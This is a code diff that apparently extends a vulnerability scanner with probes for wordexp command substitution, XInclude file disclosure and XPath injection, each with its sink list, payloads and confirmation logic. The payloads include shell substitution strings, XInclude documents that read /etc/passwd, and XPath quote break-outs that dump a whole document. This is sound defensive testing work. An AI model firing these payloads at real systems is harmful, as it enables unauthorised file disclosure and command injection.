@@ -131,6 +131,77 @@ def xxe_payloads(marker=None):
     ]
 
 
+def wordexp_payloads(marker: str):
+    """`wordexp()` performs the SHELL's own expansions, command substitution among them -- so a
+    user string reaching it is command injection in a binary with no `system` and no `popen`
+    anywhere in it. Only the substitution forms are useful: `wordexp` REJECTS a bare `;` or `|` as
+    a syntax error (measured: "bad pattern"), which is exactly why the `cmdi` payload set does not
+    confirm here and this one is separate."""
+    m = marker
+    return [f"$(echo {m})", f"`echo {m}`", f"/tmp/$(echo {m})", f"$(echo {m} > /dev/stdout)"]
+
+
+def xinclude_payloads(marker=None):
+    """XInclude file disclosure. This is NOT an XXE variant: XInclude is a separate libxml2
+    feature with its own file-reading power, and the standard XXE fix -- parsing without
+    `XML_PARSE_NOENT` so external entities are never substituted -- does nothing to it. Measured
+    on a parser built that way: the `<!ENTITY SYSTEM>` document came back with the entity
+    UNEXPANDED while `<xi:include parse="text">` returned /etc/passwd.
+
+    `parse="text"` rather than the default `parse="xml"` because /etc/passwd is not well-formed
+    XML and an xml-parse include of it fails."""
+    ns = b'xmlns:xi="http://www.w3.org/2001/XInclude"'
+    return [
+        b'<?xml version="1.0"?><r ' + ns +
+        b'><xi:include href="file:///etc/passwd" parse="text"/></r>',
+        b'<r ' + ns + b'><xi:include href="/etc/passwd" parse="text"/></r>',
+        b'<?xml version="1.0"?><r ' + ns +
+        b'><xi:include href="file:///etc/passwd" parse="text" encoding="utf-8"/></r>',
+    ]
+
+
+def xpath_payloads(marker: str):
+    """XPath injection: the expression is built by concatenating a user string into a predicate.
+
+    Two kinds, in attack order. The first break out of the quoted predicate and union in node sets
+    the original expression could never reach -- `//*` returns the WHOLE document, which is the
+    actual disclosure (measured: a lookup restricted to a `public` element returned every
+    `secret` element in the document). The second are unbalanced quotes, which make the evaluator
+    raise, and that is what `xpath_confirm` keys on: an engine syntax error proves the string
+    reaches the evaluator in a target that escapes nothing, and a target that binds or escapes its
+    value never produces one."""
+    m = marker
+    return [
+        "x'] | //* | //a[name='",
+        "'] | //*[1] | //a['",
+        "x'] | //secret | //a[name='",
+        "' or '1'='1",
+        "x' or 1=1 or 'x",
+        f"'{m}",                                         # unbalanced -> an evaluator error
+        f"x'] {m} [",
+    ]
+
+
+#: libxml2 / XPath evaluator diagnostics. Each proves the input reached the EXPRESSION PARSER,
+#: which a target that escapes or binds its value never lets happen for a literal string.
+_XPATH_ERRORS = (b"xpath error", b"invalid predicate", b"invalid expression",
+                 b"unregistered function", b"unfinished literal", b"expected $ for variable",
+                 b"undefined namespace prefix", b"xpath failed")
+
+
+def xpath_confirm(out: bytes, payload, marker: str) -> bool:
+    """An evaluator error, with the payload NOT echoed verbatim -- the same two-part test as
+    `sqli_confirm`'s error branch, and for the same reason: a program that prints the expression it
+    built would otherwise confirm by reflection alone."""
+    pb = payload if isinstance(payload, bytes) else str(payload).encode()
+    low = out.lower()
+    if not any(e in low for e in _XPATH_ERRORS):
+        return False
+    # The fixture class that prints its own query would reflect the payload; require the error to
+    # come with something other than a bare echo of what we sent.
+    return low.count(pb.lower()) <= 1
+
+
 # name -> {cwe, severity, sinks, payloads(marker)->list, confirm(out,payload,marker)->bool, title}
 #: WHAT A CONFIRMATION PROVES, which is not the same for every class and decides the rung.
 #:
@@ -195,6 +266,37 @@ PROBES = {
         "payloads": lambda m: xxe_payloads(m), "confirm": traversal_confirm,
         "proves": _PROVES_EFFECT,
         "title": "XML external entity (XXE)", "binary": True},
+    "wordexp-command-substitution": {
+        "cwe": "CWE-78", "severity": "critical",
+        # wordexp/wordexp-adjacent expanders. NOT the `system`/`popen` family: the point of this
+        # probe is the target that has NEITHER and still runs a command.
+        "sinks": {"wordexp", "__wordexp", "wordexp_l"},
+        "payloads": lambda m: wordexp_payloads(m), "confirm": cmdi_confirm,
+        "proves": _PROVES_EFFECT,
+        "title": "Command injection through shell expansion (wordexp)", "binary": True},
+    "xinclude": {
+        "cwe": "CWE-611", "severity": "high",
+        # The XInclude processors. A target that calls one of these is exposed EVEN IF it parses
+        # with external entities disabled, which is why this is not folded into the xxe probe.
+        "sinks": {"xmlXIncludeProcess", "xmlXIncludeProcessFlags", "xmlXIncludeProcessTree",
+                  "xmlXIncludeProcessTreeFlags", "xmlXIncludeProcessNode",
+                  "xmlXIncludeProcessFlagsData", "xmlXIncludeNewContext"},
+        "payloads": lambda m: xinclude_payloads(m), "confirm": traversal_confirm,
+        "proves": _PROVES_EFFECT,
+        "title": "XInclude file disclosure", "binary": True},
+    "xpath-injection": {
+        "cwe": "CWE-643", "severity": "high",
+        # libxml2's XPath evaluators, taking an expression built as a string.
+        "sinks": {"xmlXPathEval", "xmlXPathEvalExpression", "xmlXPathCompile",
+                  "xmlXPathCompiledEval", "xmlXPathNodeEval", "xmlXPathEvalPredicate",
+                  "xmlXPathCtxtCompile"},
+        "payloads": lambda m: xpath_payloads(m), "confirm": xpath_confirm,
+        # CAPABILITY, not EFFECT: the error proves we control the expression. What that DISCLOSES
+        # depends on the document, and there is no document-independent marker an injected XPath 1.0
+        # expression can make the engine emit -- `|` unions node sets and cannot introduce a
+        # literal -- so claiming demonstrated disclosure from a generic payload would be a guess.
+        "proves": _PROVES_CAPABILITY,
+        "title": "XPath injection", "binary": True},
     "sql-injection": {
         "cwe": "CWE-89", "severity": "critical",
         # the query-string sinks (sqlite / mysql / postgres). A prepared-statement API that binds
